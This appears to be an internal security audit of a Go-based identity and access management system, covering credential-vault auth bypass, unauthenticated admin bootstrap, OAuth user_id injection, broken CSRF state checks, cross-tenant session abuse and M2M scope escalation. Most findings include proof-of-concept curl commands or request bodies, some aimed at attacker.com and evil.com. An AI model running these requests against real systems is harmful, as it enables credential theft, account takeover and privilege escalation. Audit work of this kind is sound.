# IAM Security Audit — 2026-07-23

## Attack Surface #1: Authentication Bypass

### P0-1: Credential Vault — Complete Authentication Bypass (IDOR + Auth Bypass)

**Severity:** P0 (Critical)
**CVSS:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H)

**Affected endpoints:**
- `GET /api/v1/auth/credentials/{key}?user_id={any_user_id}`
- `POST /api/v1/auth/credentials/store`

**Root cause:**

The credential vault endpoints are listed in `publicPaths` (router.go:41-42):
```go
"/api/v1/auth/credentials/",      // line 41
"/api/v1/auth/credentials/store", // line 42
```

This triggers the following bypass chain:

1. **Gateway `Handler()`** (router.go:664): Path matches publicPaths → `isPublic = true` → `JWTAuth(required=false)` is applied. No token required to pass through.

2. **`RequireAdminScope`** (rbac.go:93-96): `isRBACExempt()` returns `true` for all publicPaths (set via `SetRBACExemptPrefixes(publicPaths)` in router.go:133). Middleware passes through.

3. **`checkRouteScope`** (router.go:770): `claims.Subject == ""` (no JWT) → returns `true` (skip).

4. **Auth service `handleCredentialVault`** (credential_vault_handler.go:72-178): Accepts `user_id` from:
   - POST: JSON request body field `"user_id"` (line 76-77)
   - GET: Query parameter `user_id` (line 125)
   
   **No authentication check whatsoever.** The handler does not verify:
   - `X-User-ID` header (which the gateway sets from JWT)
   - Any JWT claim or context value
   - Any internal secret or HMAC signature

**Attack scenario:**

```
# Retrieve any user's decrypted credential (no auth):
curl "http://target/api/v1/auth/credentials/aws_secret?user_id=550e8400-e29b-41d4-a716-446655440000"

# Overwrite any user's credential (no auth):
curl -X POST "http://target/api/v1/auth/credentials/store" \
  -H 'Content-Type: application/json' \
  -d '{"user_id":"550e8400-e29b-41d4-a716-446655440000","key":"aws_secret","value":"AKIA-ATTACKER-KEY"}'
```

**Impact:**
- Any unauthenticated attacker can retrieve any user's stored plaintext secrets (API keys, passwords, etc.)
- Attacker can overwrite any user's credentials, enabling supply-chain style attacks
- Cross-tenant: `user_id` is not tenant-scoped — any user in any tenant is affected

**Note:** The credential vault also stores to DB with `user_id` as a simple string concatenation for the vault ID (`req.UserID + ":" + req.Key`), enabling predictable ID enumeration.

---

### P1-1: System Bootstrap — Unauthenticated Admin Creation

**Severity:** P1 (High)
**CVSS:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H)

**Affected endpoint:**
- `POST /api/v1/system/bootstrap`

**Root cause:**

`/api/v1/system/bootstrap` is in `publicPaths` (router.go:61). The handler `handleSystemBootstrap` (integration_handlers.go:166-470):

1. Checks `quickstartInitialized` in-memory flag (line 174)
2. Checks if tenants exist in DB (line 194+)
3. Creates admin user, tenant, roles, and OAuth client if not initialized
4. **Performs NO authentication check** — anyone can call this endpoint

The only protection is the "already initialized" guard. On a fresh deployment, before the legitimate admin bootstraps the system, an attacker can race to create their own admin account.

**Attack scenario:**
```
# On a freshly deployed instance (before admin bootstraps):
curl -X POST "http://target/api/v1/system/bootstrap" \
  -H 'Content-Type: application/json' \
  -d '{"admin_username":"attacker","admin_email":"attacker@evil.com","admin_password":"Attacker123!"}'
```

**Impact:** Attacker gains full admin access to the IAM system on fresh deployments or after DB resets.

---

### P1-2: System Status — Information Disclosure

**Severity:** P1 (Medium)
**CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L)

**Affected endpoint:**
- `GET /api/v1/system/status`

**Root cause:** In `publicPaths` (router.go:62). Returns system version, uptime, DB/Redis/NATS connectivity status, user/tenant counts (quickstart_handler.go:150-197).

**Impact:** Unauthenticated attackers gain infrastructure reconnaissance data.

---

### P1-3: Dashboard Endpoint — Unauthenticated Access

**Severity:** P1 (Medium)

**Affected endpoint:**
- `GET /api/v1/dashboard` (and sub-paths via prefix match)

**Root cause:** `/api/v1/dashboard` is in `publicPaths` (router.go:64). The prefix match `strings.HasPrefix(r.URL.Path, pp)` means `/api/v1/dashboard/stats` also matches as public.

However, `handleDashboardStats` is handled at router.go:462 which is inside `ServeHTTP` — the inner handler that runs after JWTAuth(required=false). So JWT is optional but not required. The handler itself may or may not check auth internally.

---

### Info-1: `apiKeyHasWriteAccess` — Dead Code with Empty Loop Body

**Severity:** Informational

**Location:** middleware.go:912-918

```go
for _, s := range scopes {
    if s == "*" || s == "platform:admin" || s == "tenant:admin" {
        // EMPTY BODY — should return true but doesn't
    }
}
```

The loop matches admin/wildcard scopes but the body is empty. This function appears to be dead code (replaced by `HasPermissionForRoute`), but if resurrected, would silently fail to grant admin access — or worse, if someone "fixes" it to `return true`, it could become an unintended privilege escalation path.

---

---

## Attack Surface #2: Authorization Logic Vulnerabilities — RBAC Bypass, M2M Token Permissions, API Key Scope

### P1-4: Broken Wildcard Bypass in JWTAuth for API Keys (Fail-Closed Logic Bug)

**Severity:** P1 (High — latent privilege escalation risk)
**CVSS:** 6.5 (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N)
**Location:** `services/gateway/internal/middleware/middleware.go:643-649`

**Root cause:**

The wildcard/admin scope bypass in JWTAuth's API key path has a logic bug — `hasWildcard` is never set to `true`:

```go
hasWildcard := false
for _, s := range scopes {
    if s == "*" || s == "platform:admin" || s == "tenant:admin" {
        break  // BUG: exits loop but never sets hasWildcard = true
    }
}
if !hasWildcard {
    // Always reached — 403 for all routes not in routePermissionResource
    w.WriteHeader(http.StatusForbidden)
    return
}
```

**Current behavior:** Fail-closed. API keys with `*`, `platform:admin`, or `tenant:admin` scopes are silently denied for any route not in `routePermissionResource`. The wildcard bypass is dead code.

**Exploitation risk:** If a developer "fixes" this bug by adding `hasWildcard = true` before `break` (the obvious fix), API keys with `*` scope would bypass ALL `HasPermissionForRoute` checks, granting access to every route in `routePermissionResource`:
- `/api/v1/users` → `users:*`
- `/api/v1/roles` → `roles:*`
- `/api/v1/audit/` → `audit:*`
- `/api/v1/policies` → `policies:*`
- `/api/v1/webhooks` → `webhooks:*`
- `/api/v1/oauth/clients` → `oauth:*`
- `/api/v1/settings/` → `settings:*`

Combined with Finding P2-5 (no scope validation on API key creation), this would allow a tenant admin to create an API key with `*` scope and access all admin endpoints within the tenant.

**Impact:** Currently no direct exploit (fail-closed), but represents a latent P0 if "fixed" without adding scope validation.

---

### P2-4: RequireAdminScope Bypasses Admin Scope Check for API Key Requests

**Severity:** P2 (Medium)
**CVSS:** 5.7 (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N)
**Location:** `services/gateway/internal/middleware/rbac.go:133-136`

**Root cause:**

When `claims.Subject == ""` (API key request, no JWT Bearer token), RequireAdminScope passes the request through to admin endpoints without any admin scope check:

```go
// Admin endpoint: check scope.
// No JWT subject → let JWTAuth handle the 401.
if claims.Subject == "" {
    next.ServeHTTP(w, r)  // PASSES THROUGH — no scope check!
    return
}
```

The comment says "let JWTAuth handle the 401," but JWTAuth already validated the API key via `HasPermissionForRoute`. So if `HasPermissionForRoute` returned true (e.g., API key has `users:write` scope for `POST /api/v1/users`), the request passes through to the admin endpoint with no additional admin scope check.

**Attack path:**
1. Admin creates API key with scopes `["users:write"]`
2. API key request: `POST /api/v1/users` with `X-API-Key: ggid_sk_...`
3. APIKeyAuth: validates key, sets context with scopes
4. JWTAuth: `HasPermissionForRoute("/api/v1/users", "POST", ["users:write"])` → true → allows
5. RequireAdminScope: `claims.Subject == ""` → passes through (line 133-136)
6. checkRouteScope: `claims.Subject == ""` → returns true (line 770-771)
7. Request reaches backend — API key holder can create users

**Mitigating factors:**
- API key creation is admin-gated (`/api/v1/api-keys` is in `adminOnlyPaths`)
- Routes not in `routePermissionResource` (e.g., `/api/v1/system/`, `/api/v1/admin/`) are not accessible
- The broken wildcard check (P1-4) prevents `*` scope from working

**Residual risk:** API key holders have no JWT, no CAE revocation, no session timeout, and no user-level audit trail. A compromised API key with `users:write` scope grants persistent, unrevocable access to user management until the key expires or is manually revoked.

---

### P2-5: No Scope Validation on API Key Creation

**Severity:** P2 (Medium)
**CVSS:** 5.1 (AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:N)
**Location:** `services/auth/internal/server/api_keys_handler.go:72-108`

**Root cause:**

API key scopes are accepted from the request body and stored directly in the database with no validation:

```go
var req struct {
    Name      string   `json:"name"`
    Scopes    []string `json:"scopes"`    // ← arbitrary, no whitelist
    ExpiresAt string   `json:"expires_at"`
}
// ... no scope validation ...
rec, err := repo.CreateWithID(r.Context(), tc.TenantID, keyID, req.Name, secret, req.Scopes, expiresAt)
```

There is no:
- Whitelist of allowed API key scopes
- Check that scopes are within the creator's own permissions
- Prevention of reserved scopes (`*`, `platform:admin`, `tenant:admin`)
- Per-scope audit logging

A tenant admin can create API keys with any scope string, including `*`, `platform:admin`, `users:admin`, `roles:admin`, etc.

**Current impact:** Limited due to P1-4 (broken wildcard) — API keys with `*` scope can only access routes in `routePermissionResource`. But if P1-4 is "fixed" without adding scope validation, API keys with `*` scope would bypass all permission checks.

---

### P2-6: Static RBAC Fallback Lacks adminProtected Guard — M2M Token Permission Bypass

**Severity:** P2 (Medium)
**CVSS:** 5.7 (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N)
**Location:** `services/gateway/internal/middleware/rbac.go:147-152` (static fallback) vs `rbac_dynamic.go:377` (dynamic)

**Root cause:**

The dynamic RBAC resolver has an `adminProtected` guard that blocks permission-based bypass for admin-protected routes:

```go
// rbac_dynamic.go:377 — DYNAMIC path (has guard)
if grant < required && !adminProtected {
    if HasPermissionForRoute(path, method, claims.Permissions) {
        grant = required
    }
}
```

But the static fallback (used when the resolver is unavailable — startup, DB/Redis outage) has NO such guard:

```go
// rbac.go:149 — STATIC fallback (no guard)
if HasPermissionForRoute(r.URL.Path, r.Method, claims.Permissions) {
    next.ServeHTTP(w, r)
    return
}
```

**Exploitation scenario:**
1. Admin creates OAuth client with `users:write` scope for M2M integration
2. Dynamic RBAC has admin-level rule for `/api/v1/users` → blocks M2M token (adminProtected guard)
3. DB/Redis outage → resolver falls back to static logic
4. M2M token with `users:write` permission now passes `HasPermissionForRoute` → **access granted**
5. M2M token can access admin user management during the outage

The comment at rbac.go:147-148 explicitly acknowledges this is intentional: "M2M tokens (client_credentials) carry permissions but no admin scope. If the token has the required permission for this route, allow it."

**Impact:** Defense-in-depth gap. M2M tokens with specific permission scopes can bypass admin route protection during RBAC resolver unavailability (startup, DB/Redis outage, or before WarmStart completes).

---

### P2-7: HasScope Function Accepts `*` as Wildcard (Latent Risk)

**Severity:** P2 (Low — latent)
**Location:** `services/gateway/internal/middleware/apikey.go:90-91`

```go
func HasScope(ctx context.Context, scope string) bool {
    // ...
    for _, s := range scopes {
        if s == scope || s == "*" {  // ← wildcard bypass
            return true
        }
    }
    return false
}
```

If any production code path uses `HasScope` to check API key permissions, an API key with `*` scope would bypass all checks. Currently only used in tests, but represents a latent risk if adopted in production code. Combined with P2-5 (no scope validation), this could allow `*` scope to bypass any `HasScope`-based check.

---

## Updated Summary

| ID | Severity | Finding | Status |
|----|----------|---------|--------|
| P0-1 | Critical | Credential Vault auth bypass — any user's secrets readable/writable without auth | New |
| P1-1 | High | System bootstrap unauthenticated — admin creation without auth on fresh deploy | New |
| P1-2 | Medium | System status info disclosure without auth | New |
| P1-3 | Medium | Dashboard endpoint public access | New |
| P1-4 | High | Broken wildcard bypass in JWTAuth for API keys — fail-closed logic bug, latent P0 if "fixed" | New |
| P2-4 | Medium | RequireAdminScope bypasses admin scope check for API key requests (claims.Subject == "") | New |
| P2-5 | Medium | No scope validation on API key creation — arbitrary scopes accepted | New |
| P2-6 | Medium | Static RBAC fallback lacks adminProtected guard — M2M token bypass during outages | New |
| P2-7 | Low | HasScope function accepts `*` as wildcard — latent risk | New |
| Info-1 | Info | Dead code: apiKeyHasWriteAccess empty loop body | New |

## Commit reviewed

```
d249d8452 fix(audit): DeleteJSON only on successful in-memory delete
```

---

## Attack Surface #3: OAuth/OIDC Flow — redirect_uri / state CSRF / PKCE / token leakage

### P0-3: Authentication Bypass in /oauth/authorize — user_id Query Parameter Injection

**Severity:** P0 (Critical)
**CVSS:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

**Affected endpoint:** `GET/POST /oauth/authorize`

**Root cause:**

The `/oauth/authorize` handler accepts `user_id` directly from the query string with no session/JWT verification:

```go
// server.go:462
userIDStr := r.URL.Query().Get("user_id")
if userIDStr == "" {
    userIDStr = r.Header.Get("X-User-ID")
}
// ... auth_ticket fallback only when userIDStr is still empty ...
userID, err := uuid.Parse(userIDStr)
if err != nil {
    renderDynamicLoginPage(w, r, tenantID, authMethods, os.Getenv("GGID_URL"))
    return
}
// Proceeds to issue authorization code for userID — no authentication check!
```

The `InternalAuthPathOnly` middleware (pkg/middleware/internal_auth.go:183-196) only protects paths containing `/internal/`. The `/oauth/authorize` endpoint is public and has no JWT/session verification middleware. The `user_id` query parameter is trusted as proof of authentication.

**Attack scenario:**

1. Attacker registers an OAuth client via DCR or uses an existing public client
2. Attacker sends: `GET /oauth/authorize?client_id=<client>&redirect_uri=https://attacker.com/cb&response_type=code&user_id=<victim_uuid>&state=xxx&scope=openid`
3. Server issues an authorization code and HTTP 302 redirects to `https://attacker.com/cb?code=<auth_code>&state=xxx`
4. Attacker exchanges the code at `/oauth/token` for access_token + id_token + refresh_token

**Requirements:** Attacker needs the victim's user UUID (obtainable via API enumeration, information disclosure, or social engineering).

**Evidence:**
- `server.go:462` — `userIDStr := r.URL.Query().Get("user_id")` — no verification
- `server.go:484` — `userID, err := uuid.Parse(userIDStr)` — only validates format, not session
- `server.go:562-575` — `CreateAuthorizationCode` called with unverified `userID`
- No JWT/session middleware on `/oauth/authorize` — `InternalAuthPathOnly` skips non-`/internal/` paths

**Recommendation:** Require a verified session token (JWT cookie or auth_ticket) before accepting `user_id`. The `user_id` query parameter must never be trusted as authentication proof.

---

### P1-3: State Parameter CSRF Protection Non-Functional — ValidateState Never Called

**Severity:** P1 (High)
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)

**Affected endpoint:** `POST /oauth/token` (authorization_code grant)

**Root cause:**

The state parameter is stored during `/authorize` (oauth_service.go:480-492) and the `ValidateState` method (oauth_service.go:1610-1639) correctly implements one-time-use semantics with Redis `GetDel` + in-memory fallback. However, `ValidateState` is **never called** from `ExchangeAuthorizationCode` or the token endpoint handler.

**Evidence:**

1. State is stored in `CreateAuthorizationCode`:
```go
// oauth_service.go:480-492
if req.State != "" {
    stateKey := fmt.Sprintf("oauth:state:%s:%s", req.ClientID, req.State)
    // ... stored in Redis or sync.Map ...
}
```

2. `ValidateState` exists and is correct (one-time use, TTL, cross-client isolation):
```go
// oauth_service.go:1610
func (s *OAuthService) ValidateState(clientID, state string) bool { ... }
```

3. BUT `ExchangeAuthorizationCode` (oauth_service.go:522-631) never calls `ValidateState`:
- Steps 1-9: client lookup, secret verify, code consume, redirect_uri match, PKCE verify, token issuance
- No state validation step anywhere

4. The token endpoint handler (server.go:690-699) does not set `State` in `TokenExchangeRequest`:
```go
resp, tokenErr = oauthSvc.ExchangeAuthorizationCode(ctx, &service.TokenExchangeRequest{
    TenantID:     tenantID,
    GrantType:    grantType,
    Code:         r.FormValue("code"),
    RedirectURI:  r.FormValue("redirect_uri"),
    ClientID:     clientID,
    ClientSecret: clientSecret,
    CodeVerifier: r.FormValue("code_verifier"),
    Audience:     r.FormValue("audience"),
    // State is NOT set — field exists in struct but is never populated
})
```

5. Grep confirms `ValidateState` is only referenced in test files — never called from production code:
```
grep ValidateState services/oauth/internal/service/oauth_service.go → only definition at line 1610
grep ValidateState services/oauth/internal/server/server.go → no matches
```

**Impact:** CSRF protection per RFC 6749 §10.12 is completely non-functional. An attacker can initiate a token exchange without a valid state parameter. Combined with P0-3, this means the entire OAuth flow has no CSRF defense.

---

### P1-4: Parameter Injection via Unencoded Values in consent_url

**Severity:** P1 (High)
**CVSS:** 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N)

**Affected endpoints:**
- `GET /oauth/authorize` (consent_required response, server.go:538)
- `POST /oauth/consent` (server.go:1179, 1187)

**Root cause:**

The `consent_url` and `redirect_url` are built by raw string concatenation without URL-encoding user-supplied parameters:

```go
// server.go:538 — consent_required response
"consent_url": "/oauth/authorize?consent=true&client_id=" + clientID +
    "&redirect_uri=" + redirectURI +
    "&response_type=code&scope=" + scopeParam +
    "&user_id=" + userIDStr,
```

```go
// server.go:1179 — consent approve handler
authURL := "/oauth/authorize?consent=true&client_id=" + clientID +
    "&redirect_uri=" + redirectURI +
    "&response_type=code&scope=" + scopeParam +
    "&state=" + state
```

```go
// server.go:1187 — consent deny handler
"redirect_url": redirectURI + "?error=access_denied&state=" + state,
```

**Note:** `BuildAuthorizeRedirectURL` (oauth_service.go:1584-1597) correctly uses `url.QueryEscape()` for `code` and `state`, but this function is NOT used in the consent flow paths above.

**Attack scenario:**

If `state` contains `&user_id=<attacker_uuid>`, the constructed URL becomes:
```
/oauth/authorize?consent=true&client_id=xxx&redirect_uri=xxx&response_type=code&scope=openid&state=abc&user_id=<attacker_uuid>
```

This injects `user_id` as a parameter, which (combined with P0-3) allows impersonation. Even without P0-3, parameter injection can override `scope`, `redirect_uri`, or `client_id`.

**Recommendation:** Use `url.Values` and `Encode()` for all URL construction involving user-supplied parameters.

---

### P2-8: PKCE Not Enforced for Confidential Clients

**Severity:** P2 (Medium)
**CVSS:** 4.3 (AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N)

**Root cause:**

PKCE is enforced for public clients (oauth_service.go:430) and when `RequirePKCE` is explicitly set (line 433), but NOT for confidential clients by default:

```go
// oauth_service.go:428-435
if client.IsPublic() && req.CodeChallenge == "" {
    return "", errors.InvalidArgument("code_challenge is required for public clients")
}
if client.RequirePKCE && req.CodeChallenge == "" {
    return "", errors.InvalidArgument("code_challenge is required for this client")
}
// No enforcement for confidential clients without RequirePKCE flag
```

OAuth 2.1 (draft §7.5) and RFC 9700 (BCP) recommend PKCE for ALL clients including confidential ones. While the PKCE implementation itself is correct (S256 only, `ValidatePKCE` rejects `plain` method at models.go:183), the enforcement gap leaves confidential clients vulnerable to authorization code interception if their transport is compromised.

---

### Info-2: No Token Leakage to Logs Found

**Status:** Clean

The token endpoint does not log access tokens, refresh tokens, authorization codes, or client secrets. The only logging in the token flow is:
- `server.go:606` — Content-Type warning (no token values)
- `oauth_service.go:1685-2003` — Refresh token rotation errors (no token values)

No `slog`/`log.Printf` calls include token or code values.

---

### Info-3: redirect_uri Validation is Correct (Exact Match)

**Status:** Clean

`ValidateRedirectURI` (models.go:96-103) performs exact string comparison against registered URIs — no wildcard matching, no prefix matching, no path traversal. This is the correct approach per RFC 6749 §3.1.2.3.

---

## Summary — Attack Surface #3

| ID | Severity | Finding | Status |
|----|----------|---------|--------|
| P0-3 | Critical | Authentication bypass via user_id query parameter in /oauth/authorize | New |
| P1-3 | High | State CSRF protection non-functional — ValidateState never called | New |
| P1-4 | High | Parameter injection via unencoded values in consent_url | New |
| P2-8 | Medium | PKCE not enforced for confidential clients | New |
| Info-2 | Info | No token leakage to logs found | Clean |
| Info-3 | Info | redirect_uri validation is exact match (correct) | Clean |

---

## Attack Surface #4: BOLA/IDOR — Cross-Tenant Access

### P1-001: `forceLogout` — Missing Authorization + Cross-Tenant BOLA

**Severity:** P1 (High)
**Endpoint:** `POST /api/v1/auth/sessions/force-logout`
**File:** `services/auth/internal/server/http.go:3146-3192`

**Finding:** The handler accepts `tenant_id` and `user_id` from the request body with **no admin scope check** (`hasAdminScope` is never called). The endpoint path `/api/v1/auth/sessions/force-logout` is not listed in gateway `adminOnlyPaths` or `defaultAdminPrefixes`, so any authenticated user can reach it.

**Impact:** A low-privilege authenticated user can force-logout **any user in any tenant** by supplying arbitrary `tenant_id` and `user_id` in the request body. Cross-tenant BOLA leading to targeted denial-of-service.

**PoC:**
```
POST /api/v1/auth/sessions/force-logout
Authorization: Bearer <any valid JWT>
Content-Type: application/json

{"tenant_id": "<target-tenant-uuid>", "user_id": "<target-user-uuid>"}
```

**Root cause:** `forceLogout` does not call `hasAdminScope(r)` or verify that `body.TenantID` matches the caller's `X-Tenant-ID` header. Compare with `handleRevokeSessions` (line 54) and `handleRevokeUser` (line 44) which both enforce admin scope and tenant matching.

---

### P1-002: `sessionLimit` — Missing Authorization + Cross-Tenant BOLA

**Severity:** P1 (High)
**Endpoint:** `POST /api/v1/auth/sessions/limit`
**File:** `services/auth/internal/server/http.go:3194-3231`

**Finding:** Identical pattern to P1-001. No admin scope check, no tenant ownership verification. Not in gateway admin path lists.

**Impact:** Any authenticated user can trigger concurrent session limit enforcement against arbitrary users across tenants.

---

### P2-003: ITDR Detection by ID — Missing Tenant Ownership Check

**Severity:** P2 (Medium)
**Endpoint:** `GET/POST /api/v1/audit/itdr/detections/{id}`
**File:** `services/audit/internal/server/itdr_handler.go:83-160`

**Finding:** `handleITDRDetectionByID`, `handleITDRAcknowledge`, and `handleITDRResolve` fetch/modify a detection by path UUID without verifying the detection's `tenant_id` matches the caller's tenant.

**Mitigating factor:** The `/api/v1/audit/` prefix is in gateway `adminOnlyPaths`, so only admin-scoped users can reach these endpoints. Defense-in-depth gap, not directly exploitable by non-admin users.

---

### Areas Checked — No Issues Found

1. **`handleSessions` (GET/DELETE)** — Session list/revoke correctly extracts user_id from JWT/X-User-ID. DELETE uses `RevokeSessionScoped` verifying tenant + user ownership.
2. **`handleRevokeSessions`** — Requires `hasAdminScope`, uses caller's tenant for non-platform-admin.
3. **`handleRevokeUser`** — Requires `hasAdminScope`, enforces cross-tenant check.
4. **`handleInvalidateSessions`** — Checks callerUserID vs path userID, or hasAdminScope.
5. **Identity service user CRUD** — `injectTenant` prefers auth middleware context. Service layer passes tenantID to repo for all queries.
6. **Audit `resolveValidatedTenant`** — Only trusts X-Tenant-ID header, rejects query param mismatch. Secure.
7. **Audit `handleEventByID`** — Post-fetch cross-tenant check. Secure.

| ID | Severity | Finding | Status |
|----|----------|---------|--------|
| P1-001 | High | forceLogout missing auth + cross-tenant BOLA | New |
| P1-002 | High | sessionLimit missing auth + cross-tenant BOLA | New |
| P2-003 | Medium | ITDR detection by ID missing tenant ownership check | New |

---

## Round 2 — Attack Surface #1: Authentication Bypass (Deep Dive)

### R2-FINDING-1 (P2): ExtractJWTClaims Priority 2 unsigned header parsing remains exploitable on public paths and API key fast-path

**Severity**: P2 (Medium) — currently no backend endpoint on a public path trusts X-Scopes for authorization, but the gateway injects forged scopes into backend requests, creating a latent privilege escalation vector.

**Code locations**:
- `services/gateway/internal/middleware/jwt_claims.go:35-116` — ExtractJWTClaims Priority 2
- `services/gateway/internal/middleware/middleware.go:642-664` — JWTAuth API key fast-path (does not set claimsKey)
- `services/gateway/internal/middleware/middleware.go:713-719` — JWTAuth(required=false) on invalid token (does not set claimsKey)
- `services/gateway/internal/router/router.go:250-261` — proxy.Director injects X-Scopes/X-Is-Admin from ExtractJWTClaims

**Root cause**: S3 fix (commit r164) added `claimsKey` to context when JWTAuth verifies a token successfully, and `ExtractJWTClaims` Priority 1 reads from context. However, two code paths skip JWT verification **without setting claimsKey**:

1. **API key fast-path** (middleware.go:642-664): When `IsAPIKeyRequest(r) && APIKeyScopesKey != nil`, JWTAuth calls `next.ServeHTTP(w, r)` directly without setting `claimsKey`. The `Authorization: Bearer <forged JWT>` header remains in the request.

2. **Public path with invalid JWT** (middleware.go:713-719): When `required=false` and `jwt.Parse` fails, JWTAuth calls `next.ServeHTTP(w, r)` without setting `claimsKey`. The forged JWT remains in the `Authorization` header.

In both cases, `ExtractJWTClaims` falls through to Priority 2, which **unsigned-parses** the JWT payload from the `Authorization` header and returns forged `Scopes`, `Subject`, `TenantID` etc.

**Attack path (API key + forged JWT)**:
1. Attacker has a low-privilege API key (e.g. `users:read` scope)
2. Sends: `X-API-Key: <valid key>` + `Authorization: Bearer <forged JWT with scope: "platform:admin">`
3. APIKeyAuth validates the key → sets APIKeyScopesKey
4. JWTAuth(required=false) → API key fast-path → skips JWT verification → does NOT set claimsKey
5. proxy.Director → ExtractJWTClaims → Priority 2 reads forged `platform:admin` from JWT payload
6. Director sets `X-Scopes: platform:admin` + `X-Is-Admin: true` on backend request
7. Backend trusts X-Scopes for authorization decisions

**Attack path (public path + forged JWT, no API key needed)**:
1. Attacker sends `Authorization: Bearer <forged JWT with scope: "platform:admin">` to any public path
2. JWTAuth(required=false) → jwt.Parse fails (invalid signature) → next.ServeHTTP without claimsKey
3. proxy.Director → ExtractJWTClaims → Priority 2 → reads forged scopes → injects X-Scopes to backend

**Current mitigating factor**: All backend endpoints that trust `X-Scopes` for authorization decisions are on protected paths (not public paths):
- `/api/v1/auth/impersonate` — protected
- `/api/v1/admin/feature-flags` — protected
- `/api/v1/org/tenants/suspend` — protected
- `/api/v1/identity/scim/config` — protected
- `/api/v1/auth/credentials/` — protected
- `/api/v1/scim/` aliases — protected (only `/scim/v2/` is public, and SCIM token middleware requires SCIM token, not X-Scopes)

On protected paths, `JWTAuth(required=true)` rejects forged JWTs at line 714 (`writeUnauthorized`), so the forged JWT never reaches `ExtractJWTClaims`.

**Risk**: This is a latent P2 vulnerability. If a future endpoint is added to a public path and its backend handler trusts `X-Scopes`, it becomes a P0 authentication bypass. The gateway's Director unconditionally injects `X-Scopes` from `ExtractJWTClaims` without distinguishing verified vs unverified sources.

**Recommendation (not fixing, audit only)**:
- Option A: Remove Priority 2 entirely from `ExtractJWTClaims` — require `claimsKey` to be set by JWTAuth. This breaks legacy paths that don't use JWTAuth, but those may not exist.
- Option B: In `proxy.Director`, only inject `X-Scopes` when `claimsKey` is present in context (i.e., JWT was signature-verified). For API key requests, derive scopes from `APIKeyScopesKey` context instead.
- Option C: In JWTAuth API key fast-path, set `claimsKey` to an empty `JWTCClaims{}` to prevent Priority 2 fallback.

### R2-FINDING-2 (P3): apiKeyHasWriteAccess is dead code with incomplete logic

**Severity**: P3 (Info) — function is defined but never called.

**Code location**: `services/gateway/internal/middleware/middleware.go:936-962`

**Finding**: `apiKeyHasWriteAccess` is defined but never called anywhere in the codebase. It contains an incomplete loop body at line 944 (`if s == "*" || s == "platform:admin" || s == "tenant:admin" { }` — empty body, no `return true`). This appears to be dead code from a refactoring that moved scope enforcement to `HasPermissionForRoute` in the JWTAuth API key fast-path (line 645).

### R2-FINDING-3 (NEEDS-VERIFY): checkRouteScope claims.Subject bypass on public path

**Severity**: NEEDS-VERIFY — the `claims.Subject == ""` skip logic in checkRouteScope (router.go:811) is designed to let anonymous requests pass through to JWTAuth for 401. But on public paths where JWTAuth(required=false) passes through invalid JWTs, ExtractJWTClaims Priority 2 returns forged `Subject != ""`, causing checkRouteScope to proceed with RBAC checks using forged scopes.

**Analysis**: On public paths, `RequireAdminScope` (which runs before `checkRouteScope`) calls `isRBACExempt` which returns true for all public paths, skipping RBAC entirely. Then `checkRouteScope` runs inside `gw.ServeHTTP` and also checks `adminOnlyPaths`/`platformOnlyPaths`. If a public path matches an admin prefix (e.g. `/api/v1/tenants/resolve` matches `/api/v1/tenants`), `checkRouteScope` would use the forged `platform:admin` scope from Priority 2 to grant access.

However, this is not independently exploitable because:
1. `checkRouteScope` only does prefix-based scope checks (no backend action)
2. The actual backend authorization happens via `X-Scopes` header (covered in R2-FINDING-1)
3. The forged scopes would need to reach a backend that trusts them

This finding is recorded for completeness but does not represent an independent attack vector beyond R2-FINDING-1.

---

## Attack Surface #2: Authorization Logic Vulnerabilities

### P0-2: Tenant Admin → Platform Admin Escalation via M2M Client Scope Injection

**Severity:** P0 (Critical)
**CVSS:** 8.8 (AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)

**Root cause:**

`OAuthService.CreateClient` (oauth_service.go:167-216) stores client scopes without any validation or filtering. Unlike `DynamicClientRegister` (oauth_service.go:2928-2944) which filters out admin/platform/system/tenant prefixed scopes, `CreateClient` accepts arbitrary scope strings including `platform:admin`.

The admin API endpoint `POST /api/v1/oauth/clients` is in `adminOnlyPaths` (router.go:806) which requires `tenant:admin` scope — accessible to any tenant administrator. There is no `platformOnlyPaths` restriction on this endpoint.

**Attack path:**

1. Tenant admin authenticates and obtains a JWT with `tenant:admin` scope
2. Tenant admin calls `POST /api/v1/oauth/clients` with:
   ```json
   {
     "name": "escalation-client",
     "type": "confidential",
     "grant_types": ["client_credentials"],
     "scopes": ["platform:admin"]
   }
   ```
3. `checkRouteScope` (router.go:909-914): `/api/v1/oauth/clients` matches `adminOnlyPaths` → `hasTenant = true` → **allowed**
4. `CreateClient` (oauth_service.go:167-216): `input.Scopes` = `["platform:admin"]` stored directly to DB — **no scope filtering**
5. Tenant admin calls `POST /api/v1/oauth/token` (public path) with `grant_type=client_credentials&client_id=<new>&client_secret=<new>`
6. `ClientCredentials` handler (oauth_service.go:2276-2281): `finalScopes = client.Scopes = ["platform:admin"]`
7. `issueClientAccessToken` (oauth_service.go:2298-2322): JWT issued with `scope: "platform:admin"`, `tenant_id: <tenant_id>`, `sub: "00000000-0000-0000-0000-000000000000"`

**Using the M2M token for platform admin access:**

8. Attacker calls `GET /api/v1/system/` with `Authorization: Bearer <M2M token>`
9. `JWTAuth` (middleware.go:759-781): Token signature verified ✓, `tenant_id` present ✓
10. `checkRouteScope` (router.go:863-880): `isPlatformTenant = true` (because `claims.Scopes` contains `platform:admin`) — **circular logic: scope claims platform:admin → isPlatformTenant=true → hasPlatform=true**
11. `platformOnlyPaths` check (router.go:901-906): `hasPlatform = true` → **allowed**
12. `RequireAdminScope` (rbac.go:176): `hasAdminScope(claims.Scopes)` returns `true` for `platform:admin` → **allowed**

**Result:** Tenant admin has escalated to platform admin, gaining access to:
- `/api/v1/system/` — system configuration
- `/api/v1/tenants/create` — create new tenants
- `/api/v1/org/tenants/suspend` — suspend any tenant
